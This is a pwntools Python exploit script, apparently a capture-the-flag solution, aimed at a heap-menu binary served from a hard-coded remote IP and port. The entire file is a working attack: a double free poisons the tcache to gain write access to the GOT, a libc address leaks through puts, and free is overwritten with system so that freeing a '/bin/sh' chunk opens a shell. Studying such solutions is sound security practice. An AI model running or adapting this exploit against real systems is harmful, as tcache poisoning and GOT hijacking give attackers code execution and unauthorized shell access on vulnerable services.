#!/usr/bin/env python3

from pwn import *

exe = ELF("vuln")
libc = ELF("libc.so.6")
ld = ELF("ld-2.27.so")

context.binary = exe
context.terminal = ["alacritty", "-e", "sh", "-c"]

def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("35.246.134.224", 30653)

r = conn()

def malloc_admin():
    r.sendlineafter(b"Choice: ", b"1")


def malloc_user(name):
    r.sendlineafter(b"Choice: ", b"2")
    r.sendlineafter(b"name: ", name)


def edit_user(name):
    r.sendlineafter(b"Choice: ", b"4")
    r.sendlineafter(b"name: ", name)


def free_admin():
    r.sendlineafter(b"Choice: ", b"6")


def free_user():
    r.sendlineafter(b"Choice: ", b"7")


def main():
    # Stage 1: Tcache poison into GOT table
    # gdb.attach(r)
    malloc_user(b"a")
    free_user()
    free_user()
    edit_user(p64(exe.got["free"]))
    malloc_admin()
    malloc_user(b"")

    # Stage 2: LIBC leak
    r.sendlineafter(b"Choice: ", b"5")
    r.recvline()
    libc_leak = u64(b"\x20" + r.recv(5) + b"\x00\x00")
    log.success(f"LIBC leak at {hex(libc_leak)}")
    libc.address = libc_leak - 0x97920
    log.info(f"LIBC base at {hex(libc.address)}")

    # Stage 3: GOT overwrite
    edit_user(p64(libc.symbols["free"]) + p64(libc.symbols["puts"]))
    free_admin()
    edit_user(p64(libc.symbols["system"]) + p64(libc.symbols["puts"]))
    malloc_user(b"/bin/sh")
    free_user()

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
